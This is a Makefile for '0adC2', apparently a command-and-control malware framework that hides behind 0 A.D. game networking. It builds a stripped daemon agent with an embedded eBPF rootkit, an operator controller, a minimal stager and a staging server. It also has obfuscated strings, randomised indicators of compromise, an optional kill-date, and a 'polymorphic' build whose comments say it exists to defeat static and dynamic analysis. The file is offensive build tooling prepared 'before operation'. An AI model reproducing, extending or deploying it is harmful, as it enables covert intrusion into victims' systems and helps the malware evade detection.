CC        = gcc
SRC       = src
TOOLS     = tools
CFG       = config

# Optional kill-date: make EXPIRE_DAYS=30 fresh_all
EXPIRE_DAYS ?= 0
ifeq ($(EXPIRE_DAYS),0)
BUILD_EXPIRE = 0
else
BUILD_EXPIRE := $(shell date -d '+$(EXPIRE_DAYS) days' +%s 2>/dev/null || \
                        date -v+$(EXPIRE_DAYS)d +%s)
endif

EXTRA_CFLAGS ?=
CFLAGS = -Wall -Wextra -O2 -std=gnu11 -I$(SRC) -DBUILD_EXPIRE=$(BUILD_EXPIRE)UL -rdynamic $(EXTRA_CFLAGS)
LIBS   = -lenet -lsodium -lm -ldl

# Polymorphic build seeds — re-evaluated on every make poly* invocation
POLY_SEED  := $(shell python3 -c "import os; print(int.from_bytes(os.urandom(4),'little')&0x7FFFFFFF)")
POLY_ALIGN := $(shell python3 -c "import os; print([4,8,16,32][os.urandom(1)[0]%4])")

BPF_CLANG ?= clang
BPF_FLAGS  = -O2 -target bpf -I/usr/include -D__TARGET_ARCH_x86 -Wno-macro-redefined

# ── BPF rootkit ─────────────────────────────────────────────────────────────

$(SRC)/bpf_rootkit.bpf.o: $(SRC)/bpf_rootkit.bpf.c
	$(BPF_CLANG) $(BPF_FLAGS) -c $< -o $@
	@echo "[*] eBPF rootkit compiled"

$(SRC)/bpf_rootkit_obj.h: $(SRC)/bpf_rootkit.bpf.o $(TOOLS)/gen_bpf_hdr.py
	python3 $(TOOLS)/gen_bpf_hdr.py $< $@

# ── Generated headers ────────────────────────────────────────────────────────

$(SRC)/obf_agent_strings.h: $(CFG)/obf_agent_msgs.txt $(TOOLS)/gen_agent_str.py
	python3 $(TOOLS)/gen_agent_str.py $(CFG)/obf_agent_msgs.txt $@

$(SRC)/obf_agent_iocs.h: $(TOOLS)/gen_agent_iocs.py
	python3 $(TOOLS)/gen_agent_iocs.py $@

$(SRC)/obf_strings.h: $(CFG)/obf_config.txt $(TOOLS)/gen_obf.py
	python3 $(TOOLS)/gen_obf.py $(CFG)/obf_config.txt $@

# ── Production agent (stripped, daemon, embedded BPF rootkit) ────────────────

POLY_DEPS := $(wildcard $(SRC)/poly_cfg.h $(SRC)/poly_stubs.h)

agent: $(SRC)/agent.c $(SRC)/c2_proto.h $(SRC)/obf_agent_strings.h \
       $(SRC)/obf_agent_iocs.h $(SRC)/bpf_rootkit_obj.h $(SRC)/bpf_load.h $(POLY_DEPS)
	$(CC) $(CFLAGS) -o $@ $(SRC)/agent.c $(LIBS)
	strip --strip-all $@
	@echo "[*] agent compiled (stripped)"
	@sha256sum $@ | awk '{print "[*] sha256:", $$1}'

# ── Debug agent (foreground, no sandbox, stderr traces) ──────────────────────

agent_debug: $(SRC)/agent.c $(SRC)/c2_proto.h $(SRC)/obf_agent_strings.h \
             $(SRC)/obf_agent_iocs.h $(SRC)/bpf_rootkit_obj.h $(SRC)/bpf_load.h $(POLY_DEPS)
	$(CC) $(CFLAGS) -DDEBUG_NO_DAEMON -o $@ $(SRC)/agent.c $(LIBS)
	@echo "[*] agent_debug compiled"
	@sha256sum $@ | awk '{print "[*] sha256:", $$1}'

# ── Verbose agent (all protocol traces active) ───────────────────────────────

agent_verbose: $(SRC)/agent.c $(SRC)/c2_proto.h $(SRC)/obf_agent_strings.h \
               $(SRC)/obf_agent_iocs.h $(SRC)/bpf_rootkit_obj.h $(SRC)/bpf_load.h $(POLY_DEPS)
	$(CC) $(CFLAGS) -DAGENT_DEBUG -DDEBUG_NO_DAEMON -o $@ $(SRC)/agent.c $(LIBS)
	@echo "[*] agent_verbose compiled"

# ── Controller (readline, ECDH, multi-agent) ─────────────────────────────────

ctrl: $(SRC)/ctrl.c $(SRC)/c2_proto.h
	$(CC) $(CFLAGS) -o $@ $(SRC)/ctrl.c $(LIBS) -lreadline
	strip --strip-all $@
	@echo "[*] ctrl compiled (stripped)"
	@sha256sum $@ | awk '{print "[*] sha256:", $$1}'

# ── Minimal stager (~14 KB, no libenet) ──────────────────────────────────────

stager: $(SRC)/stager.c $(SRC)/obf_strings.h
	$(CC) -Os -s -Wall -Wextra -I$(SRC) -o $@ $(SRC)/stager.c -lsodium
	@echo "[*] stager compiled ($$(wc -c < stager) bytes)"
	@sha256sum $@ | awk '{print "[*] sha256:", $$1}'

# ── Staging server ────────────────────────────────────────────────────────────

stage_srv: $(SRC)/stage_srv.c
	$(CC) $(CFLAGS) -o $@ $(SRC)/stage_srv.c -lsodium
	strip --strip-all $@
	@echo "[*] stage_srv compiled (stripped)"

# ── Cleanup ──────────────────────────────────────────────────────────────────

clean:
	rm -f agent agent_debug agent_verbose ctrl stager stage_srv
	rm -f $(SRC)/obf_strings.h $(SRC)/obf_agent_strings.h $(SRC)/obf_agent_iocs.h
	rm -f $(SRC)/bpf_rootkit.bpf.o $(SRC)/bpf_rootkit_obj.h
	rm -f $(SRC)/poly_cfg.h $(SRC)/poly_stubs.h
	@echo "[*] clean"

# ── Fresh builds (regenerate all random IOCs before compiling) ───────────────

.PHONY: fresh_debug
fresh_debug: clean
	$(MAKE) agent_debug ctrl
	@echo "[*] fresh_debug done"

.PHONY: fresh
fresh: clean
	$(MAKE) agent ctrl
	@printf "[*] expire: %s\n" "$(if $(filter 0,$(BUILD_EXPIRE)),never,$(shell date -d @$(BUILD_EXPIRE) '+%Y-%m-%d' 2>/dev/null || date -r $(BUILD_EXPIRE) '+%Y-%m-%d'))"
	@echo "[*] fresh done"

.PHONY: stager_fresh
stager_fresh:
	rm -f $(SRC)/obf_strings.h
	$(MAKE) stager

.PHONY: fresh_all
fresh_all: clean
	$(MAKE) agent ctrl stager_fresh stage_srv
	@echo ""
	@echo "══════════════════════════════════════════════"
	@echo "[*] Full build complete"
	@printf "[*] expire: %s\n" "$(if $(filter 0,$(BUILD_EXPIRE)),never,$(shell date -d @$(BUILD_EXPIRE) '+%Y-%m-%d' 2>/dev/null || date -r $(BUILD_EXPIRE) '+%Y-%m-%d'))"
	@echo "[*] Hashes:"
	@for f in agent ctrl stager stage_srv; do \
	    [ -f $$f ] && sha256sum $$f | awk '{print "    "$$1, $$2}'; done
	@echo "══════════════════════════════════════════════"

.PHONY: fresh_all_debug
fresh_all_debug: clean
	$(MAKE) agent_debug ctrl stager_fresh stage_srv
	@echo "[*] fresh_all_debug done"

# ── Polymorphic builds (different opcodes per invocation) ────────────────────
#
# 5-layer polymorphism:
#   1. IOC randomization    (keys, player names, BPF key)     — same as fresh_all
#   2. CFG method selection via poly_cfg.h                    — POLY_DAEMON/EXEC/HIDE/SP
#   3. Dead-code junk stubs via poly_stubs.h (POLY_CALL_CHAIN) — noinline functions, always-false guard
#   4. Live idempotent junk macros (POLY_LIVE_ALL)             — executes unconditionally, no effect
#   5. GCC internal randomization                              — -frandom-seed, -fstack-reuse=none, -falign-*
#
# Result: no two poly builds share static byte signatures in .text, and
# execution traces differ — defeating both static and dynamic analysis.

POLY_CFLAGS = -DUSE_POLY_CFG \
              -frandom-seed=$(POLY_SEED) \
              -fstack-reuse=none \
              -falign-functions=$(POLY_ALIGN) \
              -falign-loops=$(POLY_ALIGN)

.PHONY: poly_debug
poly_debug: clean
	python3 $(TOOLS)/gen_poly_cfg.py   $(SRC)/poly_cfg.h
	python3 $(TOOLS)/gen_poly_stubs.py $(SRC)/poly_stubs.h
	$(MAKE) agent_debug ctrl EXTRA_CFLAGS="$(POLY_CFLAGS)"
	@echo ""
	@echo "══════════════════════════════════════════════"
	@echo "[*] poly_debug done  seed=$(POLY_SEED)  align=$(POLY_ALIGN)"
	@for f in agent_debug ctrl; do \
	    [ -f $$f ] && sha256sum $$f | awk '{print "    "$$1, $$2}'; done
	@echo "══════════════════════════════════════════════"

.PHONY: poly_all
poly_all: clean
	python3 $(TOOLS)/gen_poly_cfg.py   $(SRC)/poly_cfg.h
	python3 $(TOOLS)/gen_poly_stubs.py $(SRC)/poly_stubs.h
	$(MAKE) agent ctrl stager_fresh stage_srv EXTRA_CFLAGS="$(POLY_CFLAGS)"
	@echo ""
	@echo "══════════════════════════════════════════════"
	@echo "[*] poly_all done  seed=$(POLY_SEED)  align=$(POLY_ALIGN)"
	@printf "[*] expire: %s\n" "$(if $(filter 0,$(BUILD_EXPIRE)),never,$(shell date -d @$(BUILD_EXPIRE) '+%Y-%m-%d' 2>/dev/null || date -r $(BUILD_EXPIRE) '+%Y-%m-%d'))"
	@echo "[*] Hashes:"
	@for f in agent ctrl stager stage_srv; do \
	    [ -f $$f ] && sha256sum $$f | awk '{print "    "$$1, $$2}'; done
	@echo "══════════════════════════════════════════════"

# ── CI target (no BPF, for GitHub Actions) ───────────────────────────────────

.PHONY: ci
ci: $(SRC)/obf_agent_strings.h $(SRC)/obf_agent_iocs.h
	$(CC) $(CFLAGS) -DCI_NO_BPF -o ctrl $(SRC)/ctrl.c $(LIBS) -lreadline
	@echo "[*] ctrl compiled (CI)"
	@sha256sum ctrl | awk '{print "[*] sha256:", $$1}'

# ── Utilities ────────────────────────────────────────────────────────────────

.PHONY: check_deps
check_deps:
	@echo "[*] Checking dependencies..."
	@pkg-config --exists libsodium && echo "  [ok] libsodium"  || echo "  [KO] libsodium (apt: libsodium-dev)"
	@pkg-config --exists libenet   && echo "  [ok] libenet"    || echo "  [KO] libenet (apt: libenet-dev)"
	@pkg-config --exists readline  && echo "  [ok] readline"   || echo "  [KO] readline (apt: libreadline-dev)"
	@$(BPF_CLANG) --version >/dev/null 2>&1 && echo "  [ok] clang" || echo "  [KO] clang (apt: clang)"
	@python3 --version >/dev/null 2>&1      && echo "  [ok] python3" || echo "  [KO] python3"
	@bpftool version >/dev/null 2>&1        && echo "  [ok] bpftool" || echo "  [??] bpftool absent (optional outside CI)"

.PHONY: hashes
hashes:
	@echo "[*] SHA256 of current binaries:"
	@for f in agent agent_debug ctrl stager stage_srv; do \
	    [ -f $$f ] && sha256sum $$f | awk '{print "  "$$2": "$$1}'; done || true

.PHONY: test_staging
test_staging: agent_debug stager stage_srv
	@echo "[*] Staging loopback test (127.0.0.1:20596) ..."
	@./stage_srv ./agent_debug 20596 &
	@sleep 0.3
	@./stager && echo "[+] stager OK" || echo "[-] stager KO"
	@pkill -f "stage_srv" 2>/dev/null || true

.PHONY: show_players
show_players:
	@python3 -c "import re,sys,os; data=open('$(SRC)/obf_agent_iocs.h').read() if os.path.exists('$(SRC)/obf_agent_iocs.h') else sys.exit('obf_agent_iocs.h missing'); hi=int(re.search(r'_k_pn_hi = 0x([0-9A-Fa-f]+)',data).group(1),16); lo=int(re.search(r'_k_pn_lo = 0x([0-9A-Fa-f]+)',data).group(1),16); key=(hi<<4)|lo; [print(f'  {m.group(1)}: {bytes(int(x,16)^key for x in m.group(2).split(\",\")).decode()}') for m in re.finditer(r'(_pn\d+)\[\]=\{([^}]+)\}',data)]"

.PHONY: all
all: agent_debug ctrl

.PHONY: help
help:
	@echo ""
	@echo "0adC2 — Makefile"
	@echo ""
	@echo "  Main targets:"
	@echo "    make fresh_debug             Rebuild debug (agent_debug + ctrl)"
	@echo "    make fresh                   Rebuild prod agent + ctrl (both stripped)"
	@echo "    make fresh_all               Rebuild EVERYTHING + new IOCs (before operation)"
	@echo "    make fresh_all EXPIRE_DAYS=N Same with kill-date in N days"
	@echo "    make poly_debug              Polymorphic debug build (unique opcodes each run)"
	@echo "    make poly_all                Polymorphic full build (unique opcodes each run)"
	@echo "    make ci                      CI build without BPF (ctrl only)"
	@echo ""
	@echo "  Individual targets:"
	@echo "    make agent        prod agent (stripped, daemon, embedded BPF rootkit)"
	@echo "    make agent_debug  debug agent (foreground, no sandbox)"
	@echo "    make ctrl         controller (readline, stripped)"
	@echo "    make stager       stager (~14KB, new IOCs, stripped via -s)"
	@echo "    make stage_srv    staging server (stripped)"
	@echo ""
	@echo "  Utilities:"
	@echo "    make check_deps   check libsodium, libenet, clang..."
	@echo "    make hashes       SHA256 of current binaries"
	@echo "    make show_players display player names from current build"
	@echo "    make test_staging loopback test stager->stage_srv"
	@echo "    make clean        remove binaries + generated headers"
	@echo ""
